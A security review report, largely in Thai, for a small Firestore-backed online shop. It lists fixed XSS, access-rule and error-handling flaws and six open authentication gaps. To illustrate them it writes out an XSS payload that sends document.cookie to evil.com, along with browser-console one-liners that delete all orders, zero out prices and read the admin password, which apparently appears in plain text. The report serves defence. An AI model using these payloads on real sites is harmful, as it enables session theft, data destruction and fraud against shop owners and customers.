# Security & Code Review - PEERAPONG SHOP

Review date: 2026-03-28

---

## สรุปสิ่งที่แก้ไข (Fixed)

---

### XSS (Cross-Site Scripting) — 7 จุด

ปัญหารวม: ข้อมูลจาก Firestore ถูก render เป็น HTML โดยตรง ไม่ผ่าน `escapeHtml()` ทำให้ถ้ามีคนใส่ `<script>` หรือ `<img onerror=...>` ใน field ต่างๆ จะรัน JavaScript ในเบราว์เซอร์ของผู้ใช้คนอื่นได้

| #   | ตำแหน่ง                          | field ที่มีปัญหา                | แก้ยังไง                                |
| --- | -------------------------------- | ------------------------------- | --------------------------------------- |
| 1   | `js/shop.js` — renderCart        | `item.name`                     | `${escapeHtml(item.name)}`              |
| 2   | `js/shop.js` — openSummaryModal  | `item.name`                     | `${escapeHtml(item.name)}`              |
| 3   | `js/shop.js` — searchHistory     | `i.name`                        | `${escapeHtml(i.name)}`                 |
| 4   | `js/shop.js` — searchHistory     | `order.status` (fallback)       | `escapeHtml(order.status)`              |
| 5   | `js/admin.js` — openStockHistory | `h.addedBy`                     | `${escapeHtml(h.addedBy)}`              |
| 6   | `js/shop.js`, `js/admin.js`      | `item.name` ใน `alt=""`         | `alt="${escapeHtml(item.name)}"`        |
| 7   | `js/admin.js` — loadProducts     | `item.name` ใน inline `onclick` | เปลี่ยนเป็น `data-*` + event delegation |

แ
**ตัวอย่างถ้าไม่แก้:**

```
ชื่อสินค้าใน Firestore: <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">

→ ลูกค้าเปิดหน้าเว็บ → script ทำงาน → ขโมย cookie/session ไปเว็บ hacker
→ ถ้าเป็น admin → hacker ได้สิทธิ์จัดการร้านทั้งหมด
```

**ตัวอย่างหลังแก้:**

```
ชื่อเดียวกันจะแสดงเป็นข้อความธรรมดา:
&lt;img src=x onerror=&quot;fetch(...)&quot;&gt;

→ ไม่รัน script → ปลอดภัย
```

---

### Firestore Rules — 3 จุด

| #   | ปัญหา                                  | ถ้าไม่แก้                           | แก้ยังไง                                                |
| --- | -------------------------------------- | ----------------------------------- | ------------------------------------------------------- |
| 8   | order status ไม่ validate ค่า          | ใส่ XSS payload ใน status field ได้ | เพิ่ม `status in ['pending', 'completed', 'cancelled']` |
| 9   | `allow delete: if true` บน orders      | ใครก็ลบ order ได้จาก console        | เปลี่ยนเป็น `allow delete: if false`                    |
| 10  | ไม่จำกัดความยาว facebook/characterName | ใส่ string 10MB → database บวม      | เพิ่ม `.size() <= 100`                                  |

**ตัวอย่างถ้าไม่แก้ (ข้อ 9):**

```javascript
// hacker เปิด browser console แล้วพิมพ์
db.collection("orders")
  .get()
  .then((s) => s.forEach((d) => d.ref.delete()));
// → order ทุกรายการถูกลบหมด!
```

**หลังแก้:** Firestore reject คำสั่ง delete → `Error: PERMISSION_DENIED`

---

### Error Handling — 3 จุด

| #   | ปัญหา                               | ถ้าไม่แก้                                      | แก้ยังไง                                        |
| --- | ----------------------------------- | ---------------------------------------------- | ----------------------------------------------- |
| 11  | `escapeHtml(null)` แสดง "undefined" | field หายจาก Firestore → เห็นคำว่า "undefined" | เพิ่ม `if (str == null) return ''`              |
| 12  | qty +/- ไม่ check `currentItem`     | กดปุ่มตอน modal ปิด → JS crash                 | เพิ่ม `if (!currentItem) return;`               |
| 13  | `order.items.map()` ไม่ check Array | document เสียหาย → crash ทั้งหน้า              | `Array.isArray(order.items) ? order.items : []` |

**ตัวอย่างถ้าไม่แก้ (ข้อ 13):**

```
order document ใน Firestore ถ้า items field หายไป:
→ TypeError: Cannot read properties of undefined (reading 'map')
→ Order Board ทั้งหน้าไม่แสดงเลย แม้ order อื่นปกติ
```

**หลังแก้:** ข้าม order ที่ items เสียหาย แสดง order อื่นได้ปกติ

---

### Input Validation — 1 จุด

| #   | ปัญหา                 | ถ้าไม่แก้                              | แก้ยังไง                            |
| --- | --------------------- | -------------------------------------- | ----------------------------------- |
| 14  | ไม่จำกัดความยาว input | ใส่ 10MB → Firestore เก็บ → render ช้า | จำกัด 100 ตัวอักษร (client + rules) |

---

### Data Integrity — 1 จุด

| #   | ปัญหา                               | ถ้าไม่แก้                                     | แก้ยังไง                    |
| --- | ----------------------------------- | --------------------------------------------- | --------------------------- |
| 15  | เพิ่ม stock กับ stockHistory แยกกัน | write ที่ 2 fail → stock เพิ่มแต่ไม่มีประวัติ | ใช้ `db.batch()` ทำพร้อมกัน |

**ตัวอย่างถ้าไม่แก้:**

```
เพิ่ม stock 10 ชิ้น → stock +10 สำเร็จ
→ internet หลุดตอน write ประวัติ → ไม่มี record ว่าใครเพิ่ม
→ ตรวจสอบย้อนหลังไม่ได้
```

**หลังแก้:** ถ้า write อันไหน fail → ทั้ง 2 อัน rollback → ข้อมูลตรงกันเสมอ

---

### Cache & Hosting — 2 จุด

| #   | ปัญหา                                          | ถ้าไม่แก้                                 | แก้ยังไง                                |
| --- | ---------------------------------------------- | ----------------------------------------- | --------------------------------------- |
| 16  | `style.css`, `modal-alert.js` ไม่มี `?v=`      | deploy ใหม่แต่ลูกค้าเห็น version เก่า     | เพิ่ม `?v=3` ทุกไฟล์                    |
| 17  | `firestore.rules`, `test-order.html` ถูก serve | ใครก็เปิดดู rules / ลบ order ผ่าน URL ได้ | เพิ่มใน `ignore` list ของ firebase.json |

**ตัวอย่างถ้าไม่แก้ (ข้อ 17):**

```
เปิด https://yoursite.com/firestore.rules
→ เห็น security rules ทั้งหมด → รู้ว่า items เปิด write → โจมตีได้ง่ายขึ้น

เปิด https://yoursite.com/clear-orders.html
→ ลบ order ทั้งหมดได้เลย
```

---

## ยังไม่ได้แก้ (ต้อง Firebase Authentication)

ปัญหาเหล่านี้เป็นระดับ architecture — ต้องเพิ่มระบบ login จริงถึงจะแก้ได้

### Authentication & Authorization

| #   | ปัญหา                                | ความเสี่ยง                                                | วิธีแก้                                  |
| --- | ------------------------------------ | --------------------------------------------------------- | ---------------------------------------- |
| A   | Items `allow write: if true`         | ใครก็แก้ราคา/ลบสินค้า/ใส่ XSS ได้                         | Firebase Auth — เฉพาะ admin เขียนได้     |
| B   | Admin password อ่านได้จาก client     | `db.collection('settings').doc('admin').get()` → ได้รหัส  | ใช้ Firebase Auth แทน Firestore password |
| C   | sessionStorage bypass                | `sessionStorage.setItem('adminAuth','true')` → เข้า admin | ใช้ Firebase Auth token                  |
| D   | stockHistory `allow create: if true` | สร้าง fake stock history ได้                              | ต้องรอ Firebase Auth                     |

### Privacy & Rate Limiting

| #   | ปัญหา                        | ความเสี่ยง                        | วิธีแก้                      |
| --- | ---------------------------- | --------------------------------- | ---------------------------- |
| E   | Orders `allow read: if true` | query ดูข้อมูลลูกค้าทุกคนได้      | จำกัด read ตาม field/auth    |
| F   | ไม่มี rate limiting          | ส่ง order ซ้ำไม่จำกัด → stock หมด | Cloud Functions + rate limit |

**ตัวอย่าง attack (ข้อ A):**

```javascript
// hacker เปิด console หน้าเว็บ
db.collection("items").doc("xxx").update({ price: 0, stock: 99999 });
// → สินค้าราคา 0 บาท stock 99999 → สั่งฟรีได้ไม่จำกัด
```

**ตัวอย่าง attack (ข้อ B):**

```javascript
db.collection("settings")
  .doc("admin")
  .get()
  .then((d) => console.log(d.data().password));
// → "peerapong" ← ได้รหัส admin เลย
```

---

## สรุปภาพรวม

| หมวด             | แก้แล้ว | รอ Auth | รวม |
| ---------------- | ------- | ------- | --- |
| XSS              | 7       | —       | 7   |
| Firestore Rules  | 3       | 2       | 5   |
| Error Handling   | 3       | —       | 3   |
| Input Validation | 1       | —       | 1   |
| Data Integrity   | 1       | —       | 1   |
| Cache & Hosting  | 2       | —       | 2   |
| Auth & Privacy   | —       | 4       | 4   |

**แก้ไปแล้ว 17 จุด** — XSS ทั้งหมด, error handling, cache, rules validation, atomic writes
**รอ Firebase Auth 6 จุด** — ต้องเพิ่มระบบ authentication ถึงจะปิดช่องโหว่ได้
